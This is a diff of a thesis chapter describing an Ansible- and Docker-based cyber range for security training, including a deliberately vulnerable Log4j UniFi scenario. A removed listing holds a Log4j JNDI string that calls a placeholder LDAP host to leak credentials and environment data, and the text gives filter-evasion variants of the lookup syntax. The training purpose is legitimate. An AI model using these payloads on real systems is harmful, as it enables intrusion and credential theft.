@@ -14,7 +14,7 @@ As a way to validate the stated hypothesis (\textit{cf.} Section \ref{sec:resear
     \item \textbf{Scenario Extensibility}: Details on how new scenarios could be developed and the necessary changes to do so.
     \item \textbf{User Interface Panel}: Presentation of the UI responsible for managing scenarios' in a sort of a CTF-level style.
     \item \textbf{Cloud Deployment}: Insights on how the cloud deployment was taken into account using Microsoft Azure as the cloud provider.
-    \item \textbf{Summary}: Final considerations on the validation chapter.
+    \item \textbf{Summary}: Final considerations on the Validation chapter.
 \end{enumerate}
 
 
@@ -22,12 +22,12 @@ As a way to validate the stated hypothesis (\textit{cf.} Section \ref{sec:resear
 
 According to Masek \textit{et al.} \cite{unleashing_full_potential_of_ansible_ref} ``\textit{the goal of the IaC is to provide system administrators with the ability to manage knowledge and experiences of plenty of subsystems from one place instead of the traditional approach where each subsystem has its dedicated administrator}''. As in the case of this article, Ansible was the selected tool to simplify the orchestration and configuration management tasks related to our subject, as it gives the ability to create a set of YAML playbook files containing procedural instructions on how a target machine should be configured. Its flexibility in working both in Linux and Windows machines and how easy it was to deploy configurations were critical aspects for choosing this tool. 
 
-Across the entire development, Docker was the selected tool responsible for provisioning Docker containers. As Ansible works on a client-only topology, the Ansible application does not need to be installed in the containers. Therefore, Ansible is responsible for both the creation and the issuing of commands to these containers, and as a result, we build an enterprise-level network entirely made of Docker containers by simply issuing a command. The entire process is relatively trivial as long as the necessary configuration files are created, as discussed later. The role of IaC here is phenomenal, as the deployment of our network consists of snippets of code used for declaring how our infrastructure should be configured, which is different from the traditional programming concepts we are currently used to.
+Across the entire development, Ansible was the selected tool responsible for provisioning Docker containers. As Ansible works on a client-only topology, the Ansible application does not need to be installed in the containers. Therefore, Ansible is responsible for both the creation and the issuing of commands to these containers, and as a result, we build an enterprise-level network entirely made of Docker containers by simply issuing a command. The role of IaC is phenomenal, as the deployment of our network consists of snippets of code used for declaring how our infrastructure should be configured, which is different from the traditional programming concepts we are currently used to.
 
-Lastly, in particular, situations, as we will later see, Vagrant, was used in order to create Windows-based scenarios. Essentially the setup we built was a Windows Vagrant box running within the Linux Docker container, letting Windows-based types of attacks be successfully explored by the trainee. One question may arise: \textit{Why not use a Windows VM instead of a Vagrant box inside a Docker container?} The issue with this approach is that more storage will be needed if we intend to run several instances of the Windows VM. Instead, the Docker read-only image will stay the same if we use the first-mentioned approach.
-Only the container that derives from that same image will change, adding its read-write layer that interacts with the Docker read-only image. As a result, the system uses way less storage. Concerning Windows-based VMs, a similar approach can be taken into account. In scenarios with more than one Windows VM, an optimal solution to reduce resource consumption would be to use a container with a hypervisor installed responsible for monitoring all the present Windows VMs, instead of having one hypervisor per Windows VM. This can be achieved using linked clones in Vagrant in which new VMs only differing in disk images are created using the parent disk image belonging to a master VM. Another key aspect of choosing this setup was consistency. We wanted to create scenarios based on containers and not use a hybrid approach that used containers and VMs separately. With this, we are ready to move into the architectural details of the project.
+Lastly, in particular situations, Vagrant was used in order to create Windows-based scenarios. Essentially, the setup we built was a Windows Vagrant box running within a Linux Docker container, letting Windows-based types of attacks be successfully explored by the trainee. One question may arise: \textit{Why not use a Windows VM instead of a Vagrant box inside a Docker container?} The issue with this approach is that more storage will be needed if we intend to run several instances of the Windows VM. Instead, the Docker read-only image will stay the same if we use the first-mentioned approach.
+Only the container that derives from that same image will change, adding its read-write layer that interacts with the Docker read-only image. As a result, the system uses way less storage. Concerning Windows-based VMs, a similar approach can be taken into account. In scenarios with more than one Windows VM, an optimal solution to reduce resource consumption would be to use a container with a hypervisor installed responsible for monitoring all the present Windows VMs, instead of having one hypervisor per Windows VM. This can be achieved using linked clones in Vagrant in which new VMs only differing in disk images are created using the parent disk image belonging to a master VM. Another key aspect of choosing this setup was consistency. We wanted to create scenarios based on containers and not use a hybrid approach that used containers and VMs separately.
 
-The engineering process, along with these tools, allowed us to obtain a set of cybersecurity training scenarios that can be run locally without needing an enormously complex infrastructure. More specifically, the lightweight containerization approach followed during the development allowed us to run complex scenarios with a distance of a command or click. In Section \ref{sec:validaiton_cloud_deployment}, we also discuss how we could export our set of cyber ranges into a remote machine again, with the help of Ansible, to perform every needed remote configuration.
+The engineering process, along with these tools, allowed us to obtain a set of cybersecurity training scenarios that can be run locally or remotely without needing an enormously complex infrastructure. More specifically, the lightweight containerization approach followed during the development allowed us to run complex scenarios with a distance of a command or click. With this, we are ready to move into the architectural details of the project.
 
 \section{Architecture} \label{sec:validation_architecture}
 
@@ -39,7 +39,7 @@ The scenario construction process using Docker containers targeted enterprise-le
     \item \textbf{Demilitarized Zone (DMZ)}, which is a network that protects the company's internal network and is targeted with untrustworthy traffic. It includes services available to the public and sits between the \textit{External Network} and the \textit{Internal Network}. It generally includes web servers, Domain Name System (DNS) servers, among others.
 \end{itemize}
 
-Our project focuses on these three distinct types of networks and considers several network services that we would typically see on enterprise networks, as depicted in Fig. \ref{fig:template_net}
+Our project focuses on these three distinct types of networks and considers several network services that we would typically see on enterprise networks, as depicted in Fig. \ref{fig:template_net}.
 
 The network architecture presented in Fig. \ref{fig:template_net} shows the services available on every Linux scenario, except for Windows-based scenarios, which slightly differ from this schema. As shown, Ansible appears as the tool responsible for configuring and provisioning the entire network.
 
@@ -63,7 +63,7 @@ Three different playbooks include all the developed scenarios. The first is expl
         loop_var: pc_info
 \end{lstlisting}
 
-Essentially, for every machine object passed, the contents of the \textit{teardown.yml} file are run. This uses the \textit{community.docker.docker\_container} module that is builtin in Ansible and removes the container under a given name.
+Essentially, for every machine object passed, the contents of the \textit{teardown.yml}, as shown in Listing \ref{lst:ansible_teardown}, file are run. This uses the \textit{community.docker.docker\_container} module that is builtin in Ansible and removes the container under a given name.
 
 \begin{lstlisting}[language=yaml,caption=File \textit{teardown.yml}.,numbers=none,label={lst:ansible_teardown}]
 - name: Remove Stale Containers (name="{{ pc_info.name }}")
@@ -95,7 +95,7 @@ As depicted in Listing \ref{lst:ansible_inventory}, each word represents a group
 
 \subsection{Generic Scenario Variables} \label{sec:generic_scenario_variables}
 
-For each playbook, a set of variables are always defined corresponding to the generic structure of the network, as presented in Fig. \ref{fig:template_net}. We start with the Docker images used across the workflow, their path, and the default image name in case none is specified.
+For each playbook, a set of variables is always defined corresponding to the generic structure of the network, as presented in Fig. \ref{fig:template_net}. We start with the Docker images used across the workflow, their path, and the default image name in case none is specified.
 
 \begin{lstlisting}[language=yaml,caption=Ansible Variables - Docker Images.,numbers=none,label={lst:ansible_vars_1}]
 general:
@@ -107,7 +107,7 @@ general:
   default_container_image_name: base_image
 \end{lstlisting}
 
-As shown in Listing \ref{lst:ansible_vars_1}, we use two Docker images: \textit{base\_image} and \textit{kali\_test\_img}. The former is an image derived from \textit{node:lts-alpine} with some extra packages installed. The Alpine distribution was chosen due to its smaller size compared to other images. As a result, the \textit{base\_image} size is around 230MB. The \textit{kali\_test\_img} is an image derived from the official \textit{kalilinux/kali-rolling} Docker image. This image was extended to include the Xfce\footnote{\url{https://www.xfce.org/}} desktop environment, characterized by its low resource consumption and user-friendliness, as well as \textit{Virtual Network Computing} (VNC) package, which allows screen sharing and remote control from another device, meaning the computer screen, keyboard, and mouse are mapped from an external device to the device installed with VNC. Accessing port 6080 on the target machine makes it possible to obtain remote control over it, which will be later used in the scenarios. This Kali Linux image is especially suited for offensive tasks, and here the only concern was providing the trainee with a broad range of tools he could use in a scenario. Therefore, the image's size is much larger (around 11GB) compared to the \textit{base\_image} used for common network services.
+As shown in Listing \ref{lst:ansible_vars_1}, we use two Docker images: \textit{base\_image} and \textit{kali\_test\_img}. The former is an image derived from \textit{node:lts-alpine} with some extra packages installed. The Alpine distribution was chosen due to its smaller size compared to other images. As a result, the \textit{base\_image} size is around 230MB. The \textit{kali\_test\_img} is an image derived from the official \textit{kalilinux/kali-rolling}\footnote{\url{https://hub.docker.com/r/kalilinux/kali-rolling}} Docker image. This image was extended to include the Xfce\footnote{\url{https://www.xfce.org/}} desktop environment, characterized by its low resource consumption and user-friendliness, as well as \textit{Virtual Network Computing} (VNC) package, which allows screen sharing and remote control from another device, meaning the computer screen, keyboard, and mouse are mapped from an external device to the device installed with VNC. Accessing port 6080 on the target machine makes it possible to obtain remote control over it, which will be later used in the scenarios. This Kali Linux image is especially suited for offensive tasks, and here the only concern was providing the trainee with a broad range of tools he could use in a scenario. Therefore, the image's size is much larger (around 11GB) compared to the \textit{base\_image} used for common network services.
 
 The second category of Ansible variables for machines belonging to the \textit{all} group can be seen in Listing \ref{lst:ansible_vars_2}.
 
@@ -151,7 +151,7 @@ machines:
         ipv4_address: 172.{{ networks.external_net.random_byte }}.0.2
 \end{lstlisting}
 
-Listing \ref{lst:ansible_vars_3} presents a typical example of the attacker machine used for offensive tasks. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, for instance, routers, and lastly, we specify where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \texttt{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes. Although Listing \ref{lst:ansible_vars_3} provided only an example of the attacker machine, other network services follow a similar logic.
+Listing \ref{lst:ansible_vars_3} presents a typical example of the attacker machine used for offensive tasks. Several attributes are specified according to the logic of a Docker container. We start by its name, the Docker image it uses, possible volumes (anonymous, named, or bind mounts), the groups the container belongs to, and published ports, meaning ports mapped between the Docker container and the host machine. Then, we specify the networks the container belongs to, which can be several, as it happens for instance in routers. Lastly, we specify where to find the DNS server. In this case, as the attacker machine is located in the external network, we redirect DNS queries to the edge router's network interface sitting in the external network so that these queries are later forwarded to the DNS server in the DMZ. This is achieved using \texttt{iptables} rules. For machines located inside the corporate network, DNS queries are sent directly to the DNS server sitting in the DMZ network without the need for any type of forwarding by the edge router. It is also important to mention other attributes that are also possible to be specified, namely the \textit{devices} and \textit{privilege} attributes, all having the same meaning as understood by Docker. Although Listing \ref{lst:ansible_vars_3} provided only an example of the attacker machine, other network services follow a similar logic.
 
 \subsection{Custom Scenario Variables} \label{sec:custom_scenario_variables}
 
@@ -168,44 +168,13 @@ dns:
       network: external_net
 \end{lstlisting}
 
-Here, a domain named \textit{example-domain.ui.com} is presented along with \textit{internal} and \textit{external} specifications of it. This is related to two distinct DNS views that are defined. By ``internal view'' we refer to devices in the internal or DMZ networks; otherwise, they belong to the ``external view''. So, in the listing mentioned above, the \textit{example-domain.ui.com} domain points to the \textit{vuln\_service} container located in the DMZ whenever devices in the ``internal view'' look for this domain. Devices in the ``external view'' point to the external network interface of the edge router. This means resolved DNS requests made by external machines will go through the edge router and be forwarded to the respective machine. 
+Here, a domain named \textit{example-domain.ui.com} is presented along with \textit{internal} and \textit{external} specifications of it. This is related to two distinct DNS views that are defined. By ``internal view'' we refer to devices in the internal or DMZ networks; otherwise, they belong to the ``external view''. So, in the listing mentioned above, the \textit{example-domain.ui.com} domain points to the \textit{vuln\_service} container located in the DMZ whenever devices in the ``internal view'' look for this domain. Devices in the ``external view'' point to the external network interface of the edge router. This means resolved DNS requests made by external machines will go through the edge router and are forwarded to the respective machine. 
 
 After talking about DNS, we will go over another set of variables, namely the set of custom machines.
 
-\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Images.,numbers=none,label={lst:ansible_vars_5}]
-vulnerables:
-  images:
-    - name: unifi_log4j
-      path: scenarios/log4j
-      dockerfile: Dockerfile.alpine.mongo
-      args:
-        VERSION: "6.4.54"
-\end{lstlisting}
-
-Listing \ref{lst:ansible_vars_5}, similarly to \ref{lst:ansible_vars_1}, presents the set of Docker images from the collection of custom machines. Still, this representation is a bit more flexible, allowing the specification of the name of the``Dockerfile''' and arguments to be read in the Docker image creation process.
+Furthermore, the set of variables concerning custom machines' Docker images have a similar format to the one presented in Listing \ref{lst:ansible_vars_1}. Still, the representation is a bit more flexible, allowing the specification of the name of the ``Dockerfile'' and arguments to be read in the Docker image creation process.
 
 Then, in the vulnerable machines section, the situation is quite the same as in Listing \ref{lst:ansible_vars_3}. The only exception is the variables attribute specific to each machine.
-
-\begin{lstlisting}[language=yaml,caption=Ansible Variables - Custom Machines.,numbers=none,label={lst:ansible_vars_6}]
-vulnerables:
-  machines:
-    - name: reverse_proxy1
-      image: reverse_proxy
-      # ... #
-      vars:
-        - domain: adminbot.mc.ax
-          targets: 
-            - name: admin_bot_frontend
-              network: dmz_net
-              port: 3000
-        - domain: adminbotapi.mc.ax
-          targets: 
-            - name: admin_bot_api
-              network: dmz_net
-              port: 8000
-\end{lstlisting}
-
-For instance, Listing \ref{lst:ansible_vars_6} refers to an NGINX reverse proxy that redirects requests according to a specified domain. The \textit{vars} attribute specifies which machine and port should be the network packets' target when communicating with a particular domain.
 
 \begin{lstlisting}[language=yaml,caption=Ansible Variables - Port Forwarding.,numbers=none,label={lst:ansible_vars_7}]
 port_forwarding:
@@ -215,13 +184,13 @@ port_forwarding:
     to_port: 443
 \end{lstlisting}
 
-Then, Listing \ref{lst:ansible_vars_7} references the port forwarding section especially relevant for external machines and how they can communicate with DMZ machines. 
+Then, Listing \ref{lst:ansible_vars_7} references the port forwarding section especially relevant for external machines and how they can communicate with DMZ machines. The attributes meaning are as follows: 
 
 \begin{itemize}
-    \item \textit{destination\_port}: the incoming port on the edge router where packets will be redirected.
-    \item \textit{to\_machine}: the target machine to which packet reaching the \textit{destination\_port} will be forward to.
+    \item \textit{destination\_port}: the incoming port on the edge router where packets will later be redirected.
+    \item \textit{to\_machine}: the target machine to which packets reaching the \textit{destination\_port} will be forward to.
     \item \textit{to\_network}: the network where the target machine is placed.
-    \item \textit{to\_port}: the destination port in the target machine to where the edge router will redirect packets to.
+    \item \textit{to\_port}: the destination port in the target machine where the edge router will redirect packets to.
 \end{itemize}
 
 Some names, such as \textit{destination\_port} and \textit{to\_port}, may be misleading. Still, they obey the convention used by \texttt{iptables}.
@@ -239,25 +208,7 @@ Lastly, we have Listing \ref{lst:ansible_vars_8}, which provides information on 
 
 \subsection{Ansible Roles \& Network Services} \label{sec:ansible_roles}
 
-The structure followed by Ansible used a feature called ``roles''. We used a different role for every milestone in the network configuration. Ansible allows defining specific variables and tasks for each role, making grouping an entire workflow into separate roles straightforward to reuse in the development cycle. The used folder structure can be viewed in Listing \ref{lst:ansible_roles}.
-
-\begin{lstlisting}[caption=Ansible Roles' Folder Structure.,numbers=none,label={lst:ansible_roles}]
-roles/
-    base/             
-    custom_machines/
-    dhcp/
-    dmz/
-    dns/
-    entrypoint/
-    firewall/
-    internal/
-    internal_pcs/
-    mesh/
-    reverse_proxies/
-    routers/
-\end{lstlisting}
-
-Each directory inside \textit{roles} represents a different role. Inside it, specific tasks are defined. The following sections detail the tasks present for each role. 
+The structure followed by Ansible used a feature called ``roles''. We used a different role for every milestone in the network configuration. Ansible allows defining specific variables and tasks for each role, making grouping an entire workflow into separate roles straightforward to reuse in the development cycle. In our folder structure, a directory represents a single \textit{role}. Inside it, specific tasks are defined. The following sections detail the tasks present for each role. 
 
 \subsubsection{Base Role} \label{sec:ansible_base_role}
 
@@ -265,7 +216,7 @@ The \textit{base} role is responsible for the scenario's initial tasks:
 
 \begin{itemize}
     \item Start the Docker service.
-    \item Building the scenario's Docker images, as presented in Listings \ref{lst:ansible_vars_1} and \ref{lst:ansible_vars_5}.
+    \item Building the scenario's Docker images, as presented in Listing \ref{lst:ansible_vars_1}.
     \item Create the Docker networks, as presented in Listing \ref{lst:ansible_vars_2}.
     \item Create generic scenario's Docker containers, as presented in Listing \ref{lst:ansible_vars_3}.
     \item Assign each created container to one or more Ansible groups.
@@ -273,20 +224,7 @@ The \textit{base} role is responsible for the scenario's initial tasks:
 
 \subsubsection{DHCP Role} \label{sec:ansible_dhcp_role}
 
-The \textit{DHCP} role is responsible for configuring the DHCP servers. At first, the \texttt{dhcp} package is installed. Then a template configuration file, as shown in Listing \ref{lst:dhcp_configuration_role}, is created. At last, the \texttt{dhcp} service daemon is started.
-
-\begin{lstlisting}[caption=DHCP Server Template Configuration.,numbers=none,label={lst:dhcp_configuration_role}]
-default-lease-time 600;
-max-lease-time 7200;
-authoritative;
-option rfc3442-classless-static-routes code 121 = array of integer 8;
-
-subnet 172.{{ networks.internal_net.random_byte }}.0.0 netmask 255.255.255.0 {
-  range 172.{{ networks.internal_net.random_byte }}.0.64 172.{{ networks.internal_net.random_byte }}.0.127;
-  option routers {{ ((machines | selectattr('name', '==', 'internal_router'))[0]['networks'] | selectattr('name', '==', 'internal_net') | map(attribute='ipv4_address')) | first }};
-  option domain-name-servers {{ ((machines | selectattr('name', '==', 'dns_server'))[0]['networks'] | selectattr('name', '==', 'dmz_net') | map(attribute='ipv4_address')) | first }};
-}
-\end{lstlisting}
+The \textit{DHCP} role is responsible for configuring the DHCP servers. At first, the \texttt{dhcp} package is installed. Then a template configuration file is created using Jinja2\footnote{\url{https://jinja.palletsprojects.com/en}} templates. At last, the \texttt{dhcp} service daemon is started.
 
 Essentially, the DHCP lease is responsible for assigning an internal IP address with the last byte ranging from 64 to 127, pinpointing the router of the internal network as the gateway router, and updating the DNS server with the one placed in the DMZ network.
 
@@ -302,7 +240,7 @@ The \textit{internal PCs} role handles the behavior of machines inside the inter
 
 \subsubsection{Internal Role} \label{sec:ansible_internal_role}
 
-The \textit{internal} role is destined for the internal machines and DHCP server. It simply configures each device's default route as the internal router's interface located in the internal network. Every time a default gateway or static route is configured across the Ansible setup, the \textit{iproute2} package, installed on each Docker image by default, is used, which allows controlling and monitoring various aspects of networking in the Linux kernel, namely routing, tunnels, network interfaces, traffic control, among others.
+The \textit{internal} role is destined for the internal machines and the DHCP server. It simply configures each device's default route as the internal router's interface located in the internal network. Every time a default gateway or static route is configured across the Ansible setup, the \textit{iproute2} package, installed on each Docker image by default, is used. The \textit{iproute2} package allows controlling and monitoring various aspects of networking in the Linux kernel, namely routing, tunnels, network interfaces, traffic control, among others.
 
 \subsubsection{DNS Role} \label{sec:ansible_dns_role}
 
@@ -314,7 +252,7 @@ The \textit{DNS} role is somewhat of a more complex role and is destined for DNS
     \item Starts the \texttt{named} DNS service.
 \end{itemize}
 
-Two Access Control Lists (ACLs) are created regarding the DNS configuration files. The \textit{internal} deals with which machines stand in the internal and DMZ networks, and the \textit{external} points to every other machine that is not part of the \textit{internal} ACL, meaning external machines only. Afterward, a distinction on the IP addresses retrieved by resolved domains for internal and external machines is made, according to what was presented in Listing \ref{lst:ansible_vars_4}. The actual configuration file is presented in Listing \ref{lst:dns_configuration_file}
+Two Access Control Lists (ACLs) are created regarding the DNS configuration files. The \textit{internal} deals with which machines stand in the internal and DMZ networks, and the \textit{external} points to every other machine that is not part of the \textit{internal} ACL, meaning external machines only. Afterward, a distinction on the IP addresses retrieved by resolved domains for internal and external machines is made, according to what was presented in Listing \ref{lst:ansible_vars_4}. The actual configuration file is presented in Listing \ref{lst:dns_configuration_file}.
 
 \begin{lstlisting}[caption=DNS Server Template Configuration.,numbers=none,label={lst:dns_configuration_file}]
 acl "exclude" {
@@ -352,7 +290,7 @@ view "external" {
 };}
 \end{lstlisting}
 
-Notice the use of Jinja2\footnote{\url{https://jinja.palletsprojects.com/en}} templating. Essentially, we create an ACL named ``exclude'' which refers to the IP address of the edge router that will perform NAT-specific packets coming from outside the organization's network. Then, we create the ``internal'' and ``external'' views, as mentioned above, which direct to different DNS zones according to the mapped domain. If the DNS query does not match an internal domain, the request will be forwarded to the \texttt{8.8.8.8} Google's public DNS server.
+Notice the use of Jinja2 templating. Essentially, we create an ACL named ``exclude'' which refers to the IP address of the edge router because it performs NAT over specific packets coming from outside the organization's network. Then, we create the ``internal'' and ``external'' views, as mentioned above, which direct to different DNS zones according to the mapped domain. If the DNS query does not match an internal domain, the request will be forwarded to the \texttt{8.8.8.8} Google's public DNS server.
 
 \subsubsection{Router Role} \label{sec:ansible_router_role}
 
@@ -360,21 +298,21 @@ The next role leads us to the router's configuration steps. Here we distinguish 
 
 The internal router takes a single action to configure its default gateway with the edge router's DMZ network interface, as this is the gateway that provides internet access to the network.
 
-The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE jump} of \texttt{iptables}. Lastly, a static route by specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.
+The edge router's task is to provide NAT to packets whose source matches the internal or DMZ networks. This is accomplished using the \texttt{MASQUERADE} jump of \texttt{iptables}. Lastly, a static route is added, specifying that packets destined to the internal network should be directed to the DMZ interface of the internal router.
 
 \subsubsection{Custom Machines Role} \label{sec:ansible_custom_machines_role}
 
-The \textit{custom machines} role is quite similar to the \textit{base} role except that it performs Docker image and container creation on the set of specific machines required by a scenario instead of the generic ones. Although both roles slightly differ, using just one role with some small conditionals would be possible. Still, the adopted approach allows more accessible future updates.
+The \textit{custom machines} role is quite similar to the \textit{base} role except that it performs Docker image and container creation on the set of specific machines required by a scenario, instead of the generic ones. Although both roles slightly differ, using just one role with some small conditionals would be possible. Still, the adopted approach allows more accessible future updates.
 
 \subsubsection{DMZ Role} \label{sec:ansible_dmz_role}
 
-The \textit{DMZ} role is also quite simple. Its target is the DNS servers, the custom machines, and reverse proxies. Two tasks are associated with this role: the static configuration route to the internal network, which directs packets to the internal router's interface on the DMZ network, and the configuration of the default gateway to access the internet, which points to the edge router's DMZ network interface.
+The \textit{DMZ} role is also quite simple. It targets DNS servers, custom machines, and reverse proxies. Two tasks are associated with this role: the static configuration route to the internal network, which directs packets to the internal router's interface on the DMZ network, and the configuration of the default gateway to access the internet, which points to the edge router's DMZ network interface.
 
 \subsubsection{Reverse Proxies Role} \label{sec:ansible_reverse_proxies_role}
 
 The \textit{reverse proxies} role, as the name suggests, targets the reverse proxies present in the network. These services sit in front of the scenario's custom machines and forward client requests to those machines. Essentially, they allow establishing HTTPS connections with the client device, handling all the SSL certificate-related tasks, and talking with the destination machine sitting in the back of the reverse proxy using an HTTP connection. In simple words, it works as a middle agent.
 
-As presented in Listing \ref{lst:ansible_vars_6}, the variables defined for the reverse proxy include a domain and information on the target machine. We provide a piece of the NGINX configuration file at Listing \ref{lst:reverse_proxy_configuration_file}. Again, it allows the configuration of several domains specified using Jinja2 templates. The reverse proxy continuously listens for connections at port 443, and according to the selected domain, it forwards the traffic to the appropriate target. If requests are made to port 80, they are redirected to port 443, meaning the HTTP connection gets upgraded to HTTPS.
+The variables defined for the reverse proxy include a domain and information on the target machine. We provide a piece of the NGINX configuration file at Listing \ref{lst:reverse_proxy_configuration_file}. Again, it allows the configuration of several domains specified using Jinja2 templates. The reverse proxy continuously listens for connections at port 443, and according to the selected domain, it forwards the traffic to the appropriate target. If requests are made to port 80, they are redirected to port 443, meaning the HTTP connection gets upgraded to HTTPS.
 
 \begin{lstlisting}[caption=Reverse Proxy Template Configuration.,numbers=none,label={lst:reverse_proxy_configuration_file}]
 http {
@@ -420,7 +358,7 @@ After copying the above-listed template configuration file to the reverse proxy,
 
 The \textit{reverse proxies} role generates a Certificate Signing Request (CSR), a specially formatted encrypted message sent from an SSL digital certificate applicant to a CA. The CA then takes the CSR and generates a public-key certificate signed by itself. At last, it removes the password from the private key of the newly issued private key and copies both this file and the public-key certificate to the reverse proxy container. At last, it starts the NGINX service with the loaded configuration. 
 
-One crucial aspect of this configuration is the signing of public-key certificates by the CA. This entails that the created root CA has to be trusted by machines that will eventually access the domain linked to the digital certificate, in this case, the attacker machine. To achieve such setup, the CA public-key certificate is loaded as trusted in this machine both system-wide and in Fiferox, as it will be later explained.
+One crucial aspect of this configuration is the signing of public-key certificates by the CA. This entails that the created root CA has to be trusted by machines that will eventually access the domain linked to the digital certificate, in this case, the attacker machine. To achieve such setup, the CA's public-key certificate is loaded as trusted in this machine both system-wide and in Firefox, as it will be later explained.
 
 \subsubsection{Firewalls Role} \label{sec:ansible_firewalls_role}
 
@@ -465,7 +403,7 @@ The \textit{entry point} role performs the necessary tasks to configure a certai
 
 \subsubsection{Mesh Role} \label{sec:ansible_mesh_role}
 
-The \textit{mesh} role handles devices that need to join the Tailscale network, called \textit{tailnet}. As explained in Section \ref{sec:selected_tools_tailscale}, this network allows communication between each device that belongs to it. This is useful when focusing on cloud deployments if we, for instance, want to connect to port 6080 on our attacker machine to be able to control it remotely and, as we will see, in the Windows-based scenarios to access the Windows Vagrant box using \textit{remote desktop}. 
+The \textit{mesh} role handles devices that need to join the Tailscale network, called \textit{tailnet}. As explained in Section \ref{sec:selected_tools_tailscale}, this network allows communication between each device that belongs to it. This is useful when focusing on cloud deployments if we, for instance, want to connect to port 6080 in our attacker machine to be able to control it remotely and, as we will see, in the Windows-based scenarios to access the Windows Vagrant box using \textit{Remote Desktop}.
 
 This role's actions start by installing Tailscale and starting the \textit{tailscaled} service. After this, the container is instructed to join a specific Tailscale network using an authentication key and by specifying a hostname for the machine. An authentication key allows the addition of new nodes to the Tailscale network without needing to sign in to the network. A reusable authentication key was created to connect multiple nodes to the network. Each time a new node joins the Tailscale network using this authentication key, it enters the group of Tailscale ephemeral nodes, which essentially refer to short-lived devices that are automatically removed from the network after a short period of inactivity and are immediately removed from the network in case they are instructed to do so. Also, the usage of the same hostname for a particular machine allows accessing it using a Tailscale feature called ``MagicDNS'' which essentially registers all the DNS names for the network's devices using the following logic: \texttt{[Device Hostname].[Network DNS Name]}
 The device's hostname was already mentioned above. By default, the network's DNS name is chosen by Tailscale upon the first usage. The ``MagicDNS'' configuration provides easy access to machines when they are not under our control. This will be very useful in Section \ref{sec:validation_cloud_deployment}.
@@ -499,22 +437,12 @@ Some techniques can be used to evade simplistic blocking of strings like \texttt
 
 Similar techniques use strings like \texttt{\$\{\$\{::-j\}\$\{::-n\}\$\{::-d\}\$\{::-i\}}. Other techniques include encoding \textit{\$\{} as \textit{\%24\%7B} or \textit{\textbackslash u0024\textbackslash u007b}.
 
-During this period of cyber war, there were attempts to gather information on the target machine using crafted strings. Several attempts were made to collect the machine users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, and hostnames, among others, as shown in Listing \ref{lst:log4j_crafted_string}.
-
-\clearpage
-
-\begin{lstlisting}[caption=Log4j Crafted String.,numbers=none,label={lst:log4j_crafted_string}]
-${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:
-imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:cont
-ainerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx
-:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES
-_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}
-\end{lstlisting}
+During this period of cyber war, there were attempts to gather information on the target machine using many crafted strings, which attempted to collect the target machine's users, Docker image names, home directory paths, details on Kubernetes and Spring, users and passwords from databases, hostnames, among others.
 
 \subsubsection{Scenario Construction} \label{sec:validation_log4j_scenario_construction}
 
-This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
-and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsgNoLookups\\=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.
+This scenario was based on the Tier 2 Unified Hack The Box\footnote{\url{https://www.hackthebox.com/}} challenge and in the \textit{SprocketSecurity} blog post \cite{sprocketsecurity_ref}, essentially reproducing a vulnerable version of the Ubiquiti UniFi network application dashboard. This works as an interface manager for all the hardware devices belonging to the Ubiquiti's mesh network allowing the changing of several network-related configurations. To replicate the scenario, we used Goofball222's GitHub UniFi Docker container repository\footnote{\url{https://github.com/goofball222/unifi}}. We opted for using version 6.4.54 and tweaked the Dockerfile suited for Alpine-based distributions by installing the \texttt{python3} package
+and removing the \texttt{JVM\_EXTRA\_OPTS=-Dlog4j2.formatMsg\\NoLookups=true} environment variable that disables variable lookups, which was turning the network application to be not vulnerable to Log4j exploit. It's also important to refer that this configuration uses a MongoDB database that supports the UniFi Network Application, where users are saved.
 
 % CA
 At first, we could not get an HTTPS connection with UniFi's dashboard as a default CA certificate was generated by an untrusted CA. Therefore, it was time to create our Certificate Authority, which is responsible for issuing the signed public-key digital certificates associated with a predefined domain name. Turning our created CA into trusted in the target device made it possible to achieve an HTTPS connection. Listing \ref{lst:cmd_commands_unifi_ca} presents the commands that were used to create the CA's key pair, generating a CSR with the \textit{subjectAltName} extension, and getting the final public-key certificate signed by the new root CA, as well as the private key's password protection removed:
@@ -547,17 +475,17 @@ The steps to load the certificates into the Docker container were as follows:
 
 \begin{enumerate}
     \item Map the certificates folder path to the \texttt{/usr/lib/unifi/cert} volume exposed by the container.
-    \item Insert in the certificates folder the PEM format SSL private key file corresponding to the SSL certificate under the name of \texttt{privkey.pem}.
-    \item Insert also in the certificates folder the PEM format SSL certificate with the full certificate chain. under the name of \texttt{fullchain.pem}.
+    \item Insert in the certificates folder the PEM format SSL private key file corresponding to the server's SSL certificate under the name of \texttt{privkey.pem}.
